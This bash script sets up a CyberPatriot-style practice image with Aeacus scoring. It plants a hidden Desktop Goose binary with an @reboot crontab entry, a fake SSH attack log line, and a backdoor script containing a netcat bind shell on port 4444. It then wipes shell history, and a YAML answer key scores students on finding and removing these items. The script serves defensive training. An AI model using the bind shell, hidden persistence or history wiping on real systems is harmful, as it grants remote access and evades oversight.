#!/bin/bash
# Aeacus Forensics Image Setup Script
# Sets up goose, crontab, log evidence, and Aeacus scoring

set -e

echo "[*] Starting Aeacus forensics image setup..."

# ============================================================
# 1. INSTALL VULNERABLE/UNNECESSARY APPS
# ============================================================
echo "[*] Installing apps for students to remove..."
sudo apt update
sudo apt install -y john wireshark nmap gedit gnome-calculator gnome-solitaire 2>/dev/null || true
echo "[+] Apps installed"

# ============================================================
# 2. SET UP DESKTOP GOOSE
# ============================================================
echo "[*] Setting up Desktop Goose..."
mkdir -p ~/.local/bin
cp ~/desktop-goose-linux-port/build/CppGoose ~/.local/bin/.goose
chmod 700 ~/.local/bin/.goose

# Add to crontab if not already there
(crontab -l 2>/dev/null | grep -q '.goose' || echo "@reboot ~/.local/bin/.goose start &" | crontab -) && echo "[+] Goose added to crontab"

# ============================================================
# 2. CREATE FORENSICS EVIDENCE
# ============================================================
echo "[*] Creating forensics evidence..."

# Add suspicious SSH log entry
echo "[+] Adding SSH attack log entry..."
echo "May  3 14:32:01 debian sshd[1234]: Failed password for root from 203.0.113.42 port 54321 ssh2" >> /var/log/auth.log

# Create backdoor script
echo "[+] Creating backdoor script..."
sudo bash -c "cat > /tmp/.sysupdate.sh << 'EOF'
#!/bin/bash
# Backdoor script
nc -l -p 4444 -e /bin/bash
EOF
chmod +x /tmp/.sysupdate.sh"

echo "[+] Forensics evidence created"

# ============================================================
# 3. CREATE AEACUS SCORING CONFIG
# ============================================================
echo "[*] Creating Aeacus scoring config..."
sudo mkdir -p /opt/Aeacus/images

sudo tee /opt/Aeacus/images/scoring.yaml > /dev/null << 'EOF'
title: "Debian 13 CyberPatriot Practice"
image_name: "debian13-practice"
point_total: 100

checks:
  # Goose removal (5 points)
  - id: "remove_goose"
    name: "Remove Desktop Goose"
    type: "command"
    command: "! pgrep -f '.goose'"
    points: 5

  # Disable SSH root login (10 points)
  - id: "ssh_root_disabled"
    name: "Disable SSH root login"
    type: "command"
    command: "grep -q '^PermitRootLogin no' /etc/ssh/sshd_config"
    points: 10

  # Update packages (10 points)
  - id: "packages_updated"
    name: "Update system packages"
    type: "command"
    command: "apt list --upgradable 2>/dev/null | wc -l | grep -q '^0$'"
    points: 10

  # Enable firewall (15 points)
  - id: "firewall_enabled"
    name: "Enable UFW firewall"
    type: "command"
    command: "ufw status | grep -q 'Status: active'"
    points: 15

  # Forensics: Rocky.jpg hidden message (15 points)
  - id: "forensics_rocky_message"
    name: "What is the secret message hidden in rocky.jpg?"
    type: "command"
    command: "steghide extract -sf ~/Desktop/rocky.jpg -p '' -of /tmp/rocky_msg.txt 2>/dev/null && grep -qi 'grace rocky save stars' /tmp/rocky_msg.txt"
    points: 15

  # Forensics: Attacker IP (10 points)
  - id: "forensics_attacker_ip"
    name: "What IP address attempted unauthorized SSH access?"
    type: "command"
    command: "grep 'Failed password' /var/log/auth.log 2>/dev/null | head -1 | grep -q '203.0.113.42'"
    points: 10

  # Forensics: Backdoor script (10 points)
  - id: "forensics_backdoor"
    name: "Find the name of the backdoor script left by the attacker"
    type: "command"
    command: "test -f /tmp/.sysupdate.sh && grep -q 'nc -l' /tmp/.sysupdate.sh"
    points: 10

  # Remove Jack the Ripper (5 points)
  - id: "remove_john"
    name: "Remove password cracking tool (John)"
    type: "command"
    command: "! dpkg -l | grep -q '^ii.*john'"
    points: 5

  # Remove Wireshark (5 points)
  - id: "remove_wireshark"
    name: "Remove network sniffer (Wireshark)"
    type: "command"
    command: "! dpkg -l | grep -q '^ii.*wireshark'"
    points: 5

  # Remove Nmap (5 points)
  - id: "remove_nmap"
    name: "Remove network scanner (Nmap)"
    type: "command"
    command: "! dpkg -l | grep -q '^ii.*nmap'"
    points: 5

  # Remove Gedit (3 points)
  - id: "remove_gedit"
    name: "Remove unnecessary text editor (Gedit)"
    type: "command"
    command: "! dpkg -l | grep -q '^ii.*gedit'"
    points: 3

  # Remove Gnome Calculator (3 points)
  - id: "remove_calculator"
    name: "Remove unnecessary app (Calculator)"
    type: "command"
    command: "! dpkg -l | grep -q '^ii.*gnome-calculator'"
    points: 3

  # Remove Gnome Solitaire (4 points)
  - id: "remove_solitaire"
    name: "Remove unnecessary game (Solitaire)"
    type: "command"
    command: "! dpkg -l | grep -q '^ii.*gnome-solitaire'"
    points: 4
EOF

echo "[+] Aeacus config created at /opt/Aeacus/images/scoring.yaml"

# ============================================================
# 4. CLEAR HISTORY (so students can't reverse engineer)
# ============================================================
echo "[*] Clearing command history..."
cat /dev/null > ~/.bash_history
cat /dev/null > ~/.zsh_history
cat /dev/null > ~/.history
history -c
history -w
sudo sh -c 'cat /dev/null > ~/.bash_history'
sudo sh -c 'history -c'
echo "[+] History cleared"

# ============================================================
# 5. TEST SCORING
# ============================================================
echo "[*] Testing Aeacus scoring..."
sudo /opt/Aeacus/aeacus score /opt/Aeacus/images/scoring.yaml

echo ""
echo "[+] Setup complete!"
echo ""
echo "Summary:"
echo "  - Desktop Goose hidden at ~/.local/bin/.goose"
echo "  - Crontab @reboot entry added"
echo "  - SSH attack log entry added"
echo "  - Backdoor script created at /tmp/.sysupdate.sh"
echo "  - Aeacus config ready at /opt/Aeacus/images/scoring.yaml"
echo ""
echo "Total points: 100"
echo "  - Remove Goose: 5 pts"
echo "  - SSH hardening: 10 pts"
echo "  - Package updates: 10 pts"
echo "  - Firewall: 15 pts"
echo "  - Steghide forensics: 15 pts"
echo "  - IP forensics: 10 pts"
echo "  - Backdoor forensics: 10 pts"
echo "  - Remove John (password cracker): 5 pts"
echo "  - Remove Wireshark (sniffer): 5 pts"
echo "  - Remove Nmap (scanner): 5 pts"
echo "  - Remove Gedit: 3 pts"
echo "  - Remove Calculator: 3 pts"
echo "  - Remove Solitaire: 4 pts"
